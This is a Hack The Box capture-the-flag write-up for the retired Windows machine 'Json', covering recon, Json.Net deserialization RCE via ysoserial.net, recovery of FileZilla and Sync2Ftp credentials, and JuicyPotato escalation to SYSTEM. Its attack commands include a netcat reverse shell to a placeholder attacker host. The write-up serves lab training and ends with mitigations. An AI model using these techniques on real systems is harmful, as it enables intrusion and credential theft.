---
machine: Json
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, web, dotnet, deserialization, juicypotato, privesc]
---

# Json — Hack The Box (Windows)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The site uses Angular and authenticates with default credentials. The OAuth2 token is base64 JSON and `/api/Account/` deserializes the Bearer with Json.Net. A `ysoserial.net` object using the `WindowsIdentity` gadget and `Json.Net` formatter runs commands as `userpool`. FileZilla Server and Sync2Ftp configuration leak credentials; `SeImpersonatePrivilege` also allows JuicyPotato and a SYSTEM shell.

## Recon

```bash
nmap -Pn -sCV -p80,445,5985 <IP>
```

- `80/tcp` IIS with an Angular app and `445` SMB.
- Login uses `/api/token` and returns an `OAuth2` cookie.
- `/api/Account/` returns the authenticated user's information.

## Enumeration

- The panel's default credentials work.
- The cookie is base64 of `{"Id":1,"UserName":"admin","Password":"<MD5>","Role":"Administrator"}`.
- The Bearer is decoded and deserialized as a Json.Net object; invalid base64 reveals the error.

## Foothold

Generate an object with `ysoserial.net -g WindowsIdentity -f Json.Net -c "<COMMAND>" -o base64` and send it as the Bearer to `/api/Account/`. The server deserializes it and runs the command as `json\userpool`.

```bash
ysoserial.exe -g WindowsIdentity -f Json.Net -c "whoami" -o base64
```

## Lateral movement

`userpool` can read `C:\Program Files\FileZilla Server\FileZilla Server.xml`, which includes the administrator hash and port 14147. Sync2Ftp credentials are also encrypted with 3DES; using the `SecurityKey`, decrypt them and access FTP as `superadmin`.

```python
from Crypto.Cipher import DES3
# key = MD5(SecurityKey), ECB mode
```

## Privilege escalation

`whoami /priv` shows `SeImpersonatePrivilege`. On Windows Server 2012 R2, JuicyPotato works and runs a binary as SYSTEM.

```cmd
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\temp\nc.exe -e cmd.exe <ATTACKER> 443" -t *
```

## Evidence

- `admin/admin` login and base64 OAuth2 cookie.
- Json.Net deserialization error.
- Command executed with `ysoserial.net`.
- FileZilla/Sync2Ftp configuration and JuicyPotato as SYSTEM.

## Lessons learned

- A token deserialized on the server is an RCE surface.
- Service admin panels store recoverable credentials.
- `SeImpersonatePrivilege` on old Windows versions leads to SYSTEM.

## Mitigation and detection

- Do not deserialize JSON into arbitrary types; use DTOs and allowlists.
- Protect FileZilla/Sync2Ftp configuration and rotate credentials.
- Apply least privilege and block JuicyPotato/RoguePotato.

## References

- [0xdf — Json](https://0xdf.gitlab.io/2020/02/15/htb-json.html)
- [IppSec — Json](https://www.youtube.com/watch?v=FPgK_udcBig)
- [Hack The Box — Json](https://app.hackthebox.com/machines/json)
